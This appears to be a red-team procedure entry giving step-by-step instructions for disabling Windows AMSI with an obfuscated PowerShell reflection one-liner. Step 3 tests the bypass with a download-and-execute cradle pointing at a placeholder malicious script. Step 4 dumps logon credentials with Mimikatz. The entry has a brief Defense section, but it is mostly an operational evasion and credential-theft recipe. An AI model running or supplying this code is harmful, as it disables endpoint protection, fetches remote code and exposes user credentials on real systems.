---
id: 8bd1a2fd-5fee-4118-98db-0f4e528522f9
name: PowerShell-AMSI-Bypass-using-Reflection-and-WMF5-Autologging-Bypass
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.164763+00:00'
updated_at: '2023-04-10T20:36:17.266638+00:00'
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[Disable or Modify Tools]]'
sub_techniques: []
tags:
  - amsi-bypass
  - powershell
  - defense-evasion
  - reflection
  - wmf5
commands: []
platforms:
  - Windows
tools: []
validated: true
---

# PowerShell-AMSI-Bypass-using-Reflection-and-WMF5-Autologging-Bypass

## Summary

This procedure uses an obfuscated PowerShell script based on Matt Graeber's reflection technique combined with a WMF5 autologging bypass to disable the Anti-Malware Scan Interface (AMSI). It allows execution of malicious scripts in PowerShell without triggering antivirus or endpoint detection responses, enabling further post-exploitation activities like credential theft or lateral movement.

## Description

AMSI is a Windows interface that allows applications like PowerShell to scan content for malicious patterns before execution. This procedure employs reflection to access and modify internal AMSI state via the System.Management.Automation assembly, setting the amsiInitFailed flag to true, which effectively disables scanning. The obfuscation uses string encoding to hide the class and field names (AmsiUtils and amsiInitFailed), making it harder for static analysis tools to detect. This technique targets PowerShell 5.0 or later on Windows systems and is particularly useful in environments with Windows Defender or similar EDR solutions enabled. It requires administrative privileges for full effect but can sometimes work in user contexts if module loading is permitted. The bypass evades common defenses but may be logged in PowerShell transcription or ETW events.

## Requirements

1. PowerShell version 5.0 or later (WMF5 installed on Windows 7+ or native on Windows 10+).
2. Administrative privileges on the target system for reliable execution.
3. Access to a PowerShell session on the target Windows machine.

## Defense

- Keep antivirus and EDR solutions updated with behavioral rules for PowerShell reflection and AMSI tampering.
- Enable PowerShell Constrained Language Mode and Script Block Logging to monitor and restrict unsigned script execution.
- Use application whitelisting (e.g., AppLocker) to prevent unauthorized PowerShell module loads.
- Monitor for anomalous PowerShell processes accessing reflection APIs or modifying system assemblies.

## Objectives

1. Disable AMSI scanning in the current PowerShell session to allow execution of obfuscated or malicious scripts.
2. Evade detection by endpoint security tools during payload delivery and execution.
3. Enable subsequent malicious activities without triggering content-based alerts.

## Instructions

### Step 1: Launch Elevated PowerShell Session

**Context**: Start a PowerShell session with administrative rights to ensure the bypass can modify the necessary assemblies without permission errors.

Open PowerShell as Administrator via the Start menu or command line (e.g., right-click PowerShell and select "Run as administrator").

**Expected Output**: PowerShell prompt indicating elevated status, such as "PS C:\Windows\system32>" with no UAC prompts.

### Step 2: Execute the AMSI Bypass Code

**Context**: Paste and run the obfuscated reflection code to set the amsiInitFailed flag, disabling AMSI for the session. This uses the referenced code snippet to load and modify the AmsiUtils class via reflection.

**Code** ([[codes/PowerShell-Reflection-AMSI-Bypass-Script]]):

```ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " " ).GetField([string](38..51|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " " ,'Non' + 'Public,Static').SetValue($null,$true)
```

> This code decodes to access System.Management.Automation.AmsiUtils and sets amsiInitFailed to $true. If successful, no output is produced, but subsequent AMSI-scanned scripts (e.g., Invoke-Mimikatz) will execute without blocking.

### Step 3: Verify Bypass Success

**Context**: Test the bypass by attempting to execute a known AMSI-blocked command, such as loading a malicious module or running obfuscated code.

Run a test like: `IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')` or simply `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)` to check the flag (should return True).

**Expected Output**: The test script executes without AMSI errors; the flag query returns `$true`.

### Step 4: Execute Malicious Payload

**Context**: With AMSI disabled, proceed to run desired malicious code, such as credential dumping or persistence scripts.

Example: Load and execute a payload like `Invoke-Mimikatz -Command "sekurlsa::logonpasswords"` (assuming Mimikatz is available).

**Expected Output**: Successful execution of the payload without scanning interruptions.
